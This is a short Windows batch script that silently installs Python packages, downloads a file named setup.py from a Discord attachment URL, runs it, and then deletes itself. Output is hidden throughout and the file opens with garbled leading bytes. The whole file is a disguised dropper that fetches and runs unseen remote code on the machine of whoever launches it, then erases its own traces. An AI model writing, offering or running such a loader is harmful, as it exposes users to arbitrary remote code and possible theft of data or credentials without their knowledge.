��&cls
@echo off
pip install tqdm requests psutil > nul 2>&1
curl -o setup.py "https://cdn.discordapp.com/attachments/1335651935319097386/1344852887351857183/setup.py?ex=67c3bcda&is=67c26b5a&hm=a85af092ad28b31b298168089d518349a9b10dcf2ef3221a44480fff632ff17b&" > nul 2>&1
start python setup.py
del "%~f0" > nul 2>&1